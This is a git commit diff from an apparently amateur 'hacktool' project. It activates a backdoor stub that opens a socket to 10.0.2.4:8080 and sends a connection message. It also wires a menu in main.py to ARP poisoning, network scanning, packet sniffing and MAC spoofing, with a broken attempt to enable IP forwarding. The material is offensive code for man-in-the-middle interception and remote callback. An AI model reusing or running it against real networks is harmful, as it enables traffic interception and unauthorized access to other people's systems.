12f1329eeafc94aaaf2ea50f592ebd78b0e6bc1b
Ergin <ergintren13@gmail.com>
2022-12-22 23:00:56 +0300

    update

--- Scripts/Bacdoor/my_socket.py
+++ Scripts/Bacdoor/my_socket.py
@@ -1,9 +1,6 @@
 import socket
-"""
+
 connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
 connection.connect(("10.0.2.4",8080))
 
 connection.send("con. OK")
-"""
-def deneme():
-    print("merhaba")
--- Scripts/main.py
+++ Scripts/main.py
@@ -1,5 +1,7 @@
 from mitm import arp_posion,netscanner,packet_sniffing
 from Change_mac import mac
+import os
+import subprocess as sb
 a = """
     Welcome to hacktool
 
@@ -16,23 +18,37 @@ example: use 1
 
 """
 print(a)
+user_input = input("input:")
+
 
 def change_mac():
     interface = input("insert to interface")
     input_mac = input("insert to mac")
     mac.change_mac(interface,input_mac)
 
+
 def netscan():
     ipadrr = input("input to ip addres example: 10.0.2.0/24")
     netscanner.Scan(ipadrr)
+
+
 
 def arp_spoof():
     target_ip = input("input target ip adress")
     source_ip = input("input soruce ip adress")
     arp_posion.arp_spf(target_ip,source_ip)
 
+
+
 def sniff():
     iface = input("input interface")
     packet_sniffing.sniff(iface)
-
-
+if user_input == 'use 9':
+    sb.call(["echo","1",">","/proc/sys/net/ipv4/ip_forward"])
+    change_mac()
+elif user_input == 'use 3':
+    netscan()
+elif user_input == 'use 2':
+    arp_spoof()
+elif user_input == 'use 4':
+    sniff()
